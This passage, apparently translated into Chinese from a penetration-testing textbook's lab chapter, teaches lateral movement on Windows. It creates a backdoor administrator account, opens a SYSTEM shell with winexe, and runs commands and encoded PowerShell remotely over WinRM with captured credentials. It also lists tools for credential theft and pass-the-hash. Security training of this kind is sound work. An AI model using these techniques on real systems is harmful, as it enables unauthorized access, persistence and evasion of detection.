

现在我们已将用户 evilhacker 添加到 Administrators 组，让我们确认我们的活动是否成功。我们将返回并针对 Administrators 组使用 net localgroup，确保我们的用户出现在列表中。我们检查输出文件，发现用户已在该组内，因此已成功。最后，让我们检查以确保我们拥有访问权限：

```
# winexe -U 'evilhacker%Abc123!' --system --uninstall //192.168.1.13 cmd
Microsoft Windows [Version 10.0.15063]
(c) 2017 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

我们已成功在系统中创建了一个后门，允许我们日后返回并访问该系统。我们已将其添加到 Administrators 组，以便将权限提升到 SYSTEM 用户。当我们尝试 winexe 命令时，成功获得了一个 shell，验证了无论用户将来如何更改密码，我们在需要时都能访问。

## 利用 WinRM

WinRM 是一个相对较新的工具，受 Windows 系统支持。从 Windows 8 和 Windows Server 2012 开始，该工具提供了一种与 Windows 系统进行远程交互的额外方式。WinRM 使用基于 Web 的连接上的 SOAP 来与目标系统交互。它支持 HTTP 和 HTTPS，以及基于 Basic Auth、哈希和 Kerberos 的身份验证。除了能够使用基于 WMI 的接口进行脚本编写、启动应用程序和与 PowerShell 交互之外，当我们发现它可用时，这是一个我们可以使用的非常强大的工具。

## 实验 10-6：使用 WinRM 执行命令

WinRM 帮助我们的方式之一是允许我们在远程系统上执行命令。不幸的是，在撰写本文时，Kali 中没有很多命令行工具可以做到这一点。但是，有一个名为 pywinrm 的 Python 库可用于与 WinRM 交互。我们将使用该库来执行命令。我们已在 Gray Hat Hacking github 仓库的 Ch10 目录中为第 5 章包含了一个脚本，它将帮助我们执行命令。但首先，我们需要安装 pywinrm Python 模块。

为此，打开一个 Kali shell 并输入 pip install pywinrm。这将下载并安装 Python 模块以及任何其他所需的子模块。安装完成后，请确保你从书籍材料中获取了 ghwinrm.py 脚本。ghwinrm.py 脚本使用 pywinrm 来允许我们通过 WinRM 调用 PowerShell 命令或 shell 脚本。

ghwinrm.py 的语法与我们使用的其他工具类似。让我们使用它来运行一个简单的 whoami 命令。我们只需要指定用户、目标以及要运行的命令：

```
# .\ghwinrm.py -c -U user%Password1 -t 192.168.1.13 whoami
desktop-krb3msi\user
```

你可以看到，我们和往常一样指定了 -U 用于用户凭据，但这里有一些额外的语法部分。-c 标志表示“运行命令”。-t 标志指定目标，命令添加到末尾。尽管我们可以看到已成功运行命令，但使用 WinRM 运行命令与 WMI 的一个区别是，命令不维护任何状态，且无法进行交互式会话。让我们看一个示例：

```
# .\ghwinrm.py -c -U user%Password1 -t 192.168.1.13 cd
C:\Users\User
# .\ghwinrm.py -c -U user%Password1 -t 192.168.1.13 cd c:\\
# .\ghwinrm.py -c -U user%Password1 -t 192.168.1.13 cd
C:\Users\User
```

这里可以看到，当我们使用 cd 打印当前目录时，我们在 User 目录中。当我们 cd 到 C: 根目录时，它不维护状态。这意味着如果我们需要在目录间移动，就必须堆叠命令，如下所示：

```
# .\ghwinrm.py -c -U user%Password1 -t 192.168.1.13 'cd c:\\ && dir'
```

```
Volume in drive C has no label.
Volume Serial Number is 9291-E8BB

Directory of c:\\

03/18/2017  02:03 PM    <DIR>          PerfLogs
07/17/2017  09:21 AM    <DIR>          Program Files
03/18/2017  07:48 PM    <DIR>          Program Files (x86)
08/30/2017  11:10 PM    <DIR>          Users
08/31/2017  05:54 PM    <DIR>          Windows
               0 File(s)              0 bytes
               5 Dir(s)  28,244,885,504 bytes free
```

通过使用 && 运算符堆叠命令，我们可以在同一行上移动并运行命令。&& 运算符表示如果第一个命令成功，则运行第二个命令。我们可以连续使用多个 && 运算符，但在此示例中，我们只是 cd 到 C: 根目录，然后执行 dir 命令。我们可以看到 C: 根目录的内容，表明我们已成功移动并运行了命令。

这只是你能做的事情的一个快速示例；使用 WinRM 将允许你执行任何不需要交互式会话即可运行的命令。这包括创建和操作服务、进程及其他系统状态。

## 实验 10-7：使用 WinRM 远程运行 PowerShell

攻击者目前采用的流行技术之一是使用 PowerShell 与系统交互。由于许多系统对 PowerShell 的记录不佳，攻击者可以隐藏其活动。这是第 15 章专门致力于使用 PowerShell 进行利用的原因之一。尽管我们不会在本章中研究利用，但让我们看看如何使用我们的 ghwinrm.py 脚本来启动一些基本的 PowerShell 命令：

```
# ./ghwinrm.py -p -U user%Password1 -t 192.168.1.13 "Get-Process"
```

| 句柄 | 非分页内存(K) | 分页内存(K) | 工作集(K) | CPU 时间(s) | ID | 会话 ID | 进程名 |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| 453 | 23 | 11464 | 29220 | 0.52 | 2000 | 1 | ApplicationFrameHost |
| 41 | 4 | 1836 | 2492 | 0.00 | 2096 | 0 | cmd |

... 出于简洁性已截断

你可以看到，我们将 -c 选项更改为 -p，以便运行 PowerShell 而不是命令 shell。用户和目标选项相同，我们将 PowerShell 方法传递给脚本以使其运行。在此示例中，我们获取进程列表，它打印的内容与在常规 PowerShell shell 中相同。这固然很好，但能够组合更复杂的脚本将使我们在使用目标系统时走得更远。

让我们创建一个基本脚本，打印谁登录到了系统。我们将此文件保存为 psscript。

```
# cat psscript
function Translate-SID
{
    param([string]$SID)
    $objSID = New-Object System.Security.Principal.SecurityIdentifier($SID)
    try {
        $objUser = $objSID.Translate([System.Security.Principal.NTAccount])
        return $objUser.Value
    }catch{
        return "Unknown"
    }
}

Get-EventLog System -Source Microsoft-Windows-Winlogon | ForEach-Object{
    $ret = New-Object PSObject
    $UserProperty = Translate-SID $_.ReplacementStrings[1]
    $time = $_.TimeGenerated

    $ret | add-Member UserID $UserProperty
    if($_.EventID -eq 7001) {
        $ret | add-Member Action "Logon"
    } else {
        $ret | add-Member Action "Logoff"
    }
    $ret | add-Member Time $time
    $ret
}
```

此脚本打印有关系统中登录或注销用户的信息、操作类型以及发生时间。我们已将此信息保存到文件中，因为 ghwinrm.py 脚本也可以将文件作为参数，在远程系统上使用 PowerShell 运行。它不会在目标系统上实际放置任何文件；相反，它使用 PowerShell 以编码形式运行这些脚本，因此我们不必担心脚本签名和其他安全限制。

```
# .\ghwinrm.py -p -U user%Password1 -t 192.168.1.13 -f psscript
```

| 用户 ID | 操作 | 时间 |
|--------|--------|------|
| DESKTOP-KRB3MSI\User | 登录 | 8/13/2017 8:46:15 PM |
| DESKTOP-KRB3MSI\User | 注销 | 8/13/2017 12:41:19 PM |
| DESKTOP-KRB3MSI\User | 登录 | 8/13/2017 7:27:26 PM |
| DESKTOP-KRB3MSI\User | 登录 | 7/17/2017 4:53:09 AM |

这里，你可以看到我们使用 -f 选项指定了要运行的文件，当它在远程系统上运行时，会为我们返回登录信息。这只是我们可能想要运行的一个脚本示例，但可能性几乎是无限的。但是，请记住存在大小限制。大文件无法正常工作，但我们可以结合多种技术来传输这些较大的文件。我们将在第 15 章中更详细地探讨该主题。

## 总结

在本章中，我们探讨了不使用利用代码即可进入目标系统的多种方法。我们研究了使用 Responder 伪造 LLMNR 和 NetBIOS 名称服务响应来窃取和破解凭据。这使我们能够收集使用 NetNTLM 传递的凭据，然后使用 John the Ripper 破解了这些凭据。

我们还研究了使用捕获的凭据运行命令的不同方法。这包括使用 winexe，它为我们提供了一个远程交互式 shell。我们还使用 WMI 来查询系统信息和运行命令。使用 WinRM，我们超越了仅仅启动 shell，能够将 PowerShell 脚本传递到目标系统。

在这样做的过程中，我们能够“以敌为资”，利用这些目标系统上的内置工具和进程。这降低了被发现的风险，也减少了在受害者系统上留下不良痕迹的可能性。

## 进一步阅读

- hashcat 哈希类型参考 https://hashcat.net/wiki/doku.php?id=example_hashes
- 传递哈希工具包 https://github.com/byt3bl33d3r/pth-toolkit 和 https://media.blackhat.com/us-13/US-13-Duckwall-Pass-the-Hash-Slides.pdf
- Responder 博客 http://g-laurent.blogspot.com/
- Responder GitHub 仓库 https://github.com/lgandx/Responder

